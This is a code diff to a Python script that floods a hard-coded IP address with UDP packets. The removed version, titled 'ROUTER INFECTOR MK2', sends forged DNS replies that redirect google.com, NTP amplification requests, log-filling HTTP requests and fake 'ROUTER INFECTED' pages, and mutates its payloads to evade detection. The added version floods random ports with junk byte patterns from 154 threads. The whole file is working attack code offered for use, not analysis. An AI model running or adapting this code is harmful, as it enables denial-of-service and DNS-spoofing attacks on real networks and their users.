@@ -4,151 +4,70 @@ import time
 import random
 
 target = "62.109.121.42"
+MIN_THREADS = 154
 
 # Colors
 RED = '\033[91m'
 GREEN = '\033[92m'
-YELLOW = '\033[93m'
-CYAN = '\033[96m'
 RESET = '\033[0m'
 
-# INFECTION PAYLOADS
-INFECTION_PAYLOADS = [
-    # 1. DNS CACHE POISON INFECTOR
-    {
-        "name": "DNS-POISON",
-        "payload": b'\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x01\x00\x04\x0a\x0a\x0a\x01',
-        "port": 53,
-        "effect": "Redirects google.com to 10.10.10.1"
-    },
-    
-    # 2. NTP MONLIST (480 Bytes)
-    {
-        "name": "NTP-AMP",
-        "payload": b'\x17\x00\x03\x2a' + b'\x00' * 476,
-        "port": 123,
-        "effect": "NTP amplification attack"
-    },
-    
-    # 3. LOG OVERFLOW
-    {
-        "name": "LOG-FLOOD",
-        "payload": b'GET /' + b'A' * 500 + b' HTTP/1.1\r\nHost: ' + b'X' * 200 + b'\r\nUser-Agent: ' + b'Mozilla/' + b'5' * 100 + b'\r\n\r\n',
-        "port": 80,
-        "effect": "Fills router logs"
-    },
-    
-    # 4. ERROR INJECTION
-    {
-        "name": "ERROR-MSG",
-        "payload": b'HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\nContent-Length: 150\r\n\r\n<html><body><h1>ROUTER INFECTED</h1><p>Network security compromised. Contact administrator immediately.</p></body></html>',
-        "port": 8080,
-        "effect": "Shows infection message"
-    },
-    
-    # 5. REDIRECT ATTACKS
-    {
-        "name": "REDIRECT",
-        "payload": b'HTTP/1.1 302 Found\r\nLocation: http://192.168.1.1:80/login.html?error=1\r\nCache-Control: max-age=3600\r\nContent-Length: 0\r\n\r\n',
-        "port": 80,
-        "effect": "Redirects to router login"
-    }
+# Virus payloads
+VIRUS_PAYLOADS = [
+    b'\xDE\xAD\xBE\xEF' * 16,  # Memory eater
+    b'\x00' * 64,  # Null virus
+    b'\xFF' * 48,  # Max byte virus
+    b'\xAA\x55\xCC\x33' * 12,  # Alternating virus
+    b'\x80' * 56,  # High bit virus
+    b'\x7F' * 60,  # Max positive virus
+    random.randbytes(64),  # Random virus
 ]
 
 # Stats
-infection_counts = {p["name"]: 0 for p in INFECTION_PAYLOADS}
 total_packets = 0
 start_time = time.time()
 
-# Mutate payload to avoid detection
-def mutate_payload(payload, mutation_rate=0.3):
-    """Randomly mutate bytes in payload"""
-    if random.random() > mutation_rate:
-        return payload
-    
-    mutated = bytearray(payload)
-    # Flip 1-5 random bytes
-    for _ in range(random.randint(1, 5)):
-        if len(mutated) > 0:
-            idx = random.randint(0, len(mutated) - 1)
-            mutated[idx] = random.randint(0, 255)
-    return bytes(mutated)
-
-# Infection attack thread
-def infection_attacker():
+# Virus UDP attack
+def virus_attack(thread_id):
     global total_packets
     
-    # Create socket pool
-    socks = []
-    for _ in range(5):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
-            socks.append(sock)
-        except:
-            pass
-    
-    if not socks:
-        return
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
         try:
-            # Pick random infection
-            infection = random.choice(INFECTION_PAYLOADS)
+            # Fast small virus payload
+            payload = random.choice(VIRUS_PAYLOADS)
+            port = random.randint(1, 65535)
             
-            # Mutate payload
-            payload = mutate_payload(infection["payload"])
-            
-            # Pick random socket
-            sock = random.choice(socks)
-            
-            # Send infection
-            sock.sendto(payload, (target, infection["port"]))
-            
-            # Update stats
-            infection_counts[infection["name"]] += 1
+            # SEND VIRUS
+            sock.sendto(payload, (target, port))
             total_packets += 1
             
         except:
-            # Recreate broken socket
+            # Recreate socket if broken
             try:
-                socks.append(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             except:
                 pass
 
-# Start infection
-print(f"{RED}{'='*60}{RESET}")
-print(f"{YELLOW}ROUTER INFECTOR MK2 - ACTIVE{RESET}")
-print(f"{RED}Target: {target}{RESET}")
-print(f"{CYAN}Payloads: DNS Poison, NTP Amp, Log Flood, Error Msg, Redirect{RESET}")
-print(f"{RED}Effect: Router infection + user confusion{RESET}")
-print(f"{RED}{'='*60}{RESET}")
+# Launch threads
+print(f"{RED}MK1DNS-POISON{RESET} | Target: {target}")
+print(f"{GREEN}Starting {MIN_THREADS} virus threads...{RESET}")
 
-# Start 50 infection threads
-for i in range(50):
-    t = threading.Thread(target=infection_attacker)
+for i in range(MIN_THREADS):
+    t = threading.Thread(target=virus_attack, args=(i,))
     t.daemon = True
     t.start()
 
-# Logging
-last_log = time.time()
+# Simple logging
 while True:
     time.sleep(1)
-    current = time.time()
+    elapsed = time.time() - start_time
+    pps = int(total_packets / elapsed) if elapsed > 0 else 0
     
-    if current - last_log >= 2:  # Log every 2 seconds
-        elapsed = current - start_time
-        pps = total_packets / elapsed if elapsed > 0 else 0
-        
-        # Find most active infection
-        top_infection = max(infection_counts.items(), key=lambda x: x[1])
-        
-        print(f"{RED}INFECTOR{RESET}:{GREEN}{int(pps)}/s{RESET} | TOP: {CYAN}{top_infection[0]}{RESET}:{YELLOW}{top_infection[1]}{RESET}")
-        
-        # Reset every 30 seconds
-        if elapsed >= 30:
-            total_packets = 0
-            infection_counts = {p["name"]: 0 for p in INFECTION_PAYLOADS}
-            start_time = time.time()
-        
-        last_log = current
+    print(f"{RED}MK1DNS-POISON{RESET}:{GREEN}{pps}/s{RESET}")
+    
+    # Reset every minute
+    if elapsed >= 60:
+        total_packets = 0
+        start_time = time.time()
